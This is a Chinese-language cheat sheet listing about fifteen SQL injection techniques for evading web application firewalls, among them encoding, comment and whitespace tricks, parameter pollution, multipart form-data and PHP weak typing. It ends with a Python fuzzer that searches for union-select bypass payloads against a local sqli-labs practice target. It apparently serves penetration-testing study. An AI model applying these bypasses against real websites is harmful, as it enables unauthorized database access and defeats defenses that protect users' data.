SQL注入绕过姿势

  1. 查询语句关键字大小写

关键字大小写变化

  1. base64编码注入

把注入语句base64编码

  1. URL编码注入

把注入语句URL编码

  1. 利用MySQL的char()函数转换注入关键字

利用MySQL自带的Char函数转换个关键字

  1. 利用数据库特性

MySQL空格可被替换为09、0A-0D、A0;

MSSQL允许01-1F替换为空字符；

MySQL空格还可替换为：%23randomText%0A这样的形式

  1. 利用脚本语言的特性，例如asp允许字符间使用多个“%”

比如：And 1=%%%%%%%%%1是合法的查询语句

  1. 利用内联注释符构成SQL注入语句

把关键字内联到注释符/！/中

  1. 重复关键字构成攻击负载

当红色的部分被检测设备过滤后，前后组合构成了完整的注入语句

  1. HTTP参数污染构成SQL注入

WAF获取第一个参数id=1而不检测后面的id=2的值,而后台程序获取的id是最后的值

  1. 利用语言编码格式的差异构成SQL注入，例如GB2312和UTF8编码时的单引号差异


  1. HTTP提交数据的方式绕过SQL注入检测

HTTP请求的方式多种多样包括：GET、POST、COOKIES,X-Forwarded-For字段，User-Agent字段等HTTP的相关字段，当检测设备未完全检测时即可绕过检测设备。

  1. form-data提交数据类型构成SQL注入

当直接提交SQL注入语句时检测设备报警，可用多表单的形式测试，原理是多表单提交后一个是上传的文件一个是注入的负载，检测设备由于检测到数据是文件而不在检测后续参数。

  1. 利用中间件的解析缺陷（nginx&apache在浏览器隐藏index.php）

当提交index.php?test=SQL时报警，而nginx和apache是根据文件后缀来判断是否解析的，当获取数据id时，有php后缀和没php后缀的处理流程不一样

  1. 脚本语言的弱类型

php语言中,id=1和id=1+and+1=2 SQL注入语句，如果经“==”是会相等的，因为intval检测时只要首位是数字就当作数字算，间接绕过检测。

  1. 利用空格、Tab、注释、特殊符号等干扰检测设备

MySQL的+和-的表示意义不一样、中文单引号与英文单引号的区别

测试脚本

import requests

url = "http://127.0.0.1/1/Less-1/?id=1"

fuzz = ['/*', '*/', '/**/', '/*!', '*', '/', '?', '`', '!', '@', '%', '.', '', ' ', '~', '|', '+', '-', '%00', '%0a', '%0b', '%0c', '%0d', '%0e', '%0f', '%0h', '%0i', '%0j']

headers = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/66.0.3359.181 Safari/537.36'
}

def fuzzfuc(depth, payload):
    if depth >= 6:
        u = url + payload + "select*/ 1, 2"
        res = requests.get(u, headers=headers)
        if 'Welcome' in res.text:
            print("[+] Payload:" + u + " --Pass")
        return

    for a in fuzz:
        fuzzfuc(depth + 1, payload + a)

fuzzfuc(0, "/*!union")
